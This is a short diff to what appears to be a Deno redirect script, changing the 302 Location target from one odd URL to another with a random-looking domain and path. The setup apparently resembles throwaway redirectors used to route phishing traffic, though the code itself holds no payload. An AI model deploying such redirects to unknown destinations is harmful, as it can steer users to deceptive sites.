@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://mecamex.net/securearth/_+_==", // Replace this with your actual link
+      Location: "https://bmopztiks.za.com/neghfhu/_+_==/", // Replace this with your actual link
     },
   });
 });
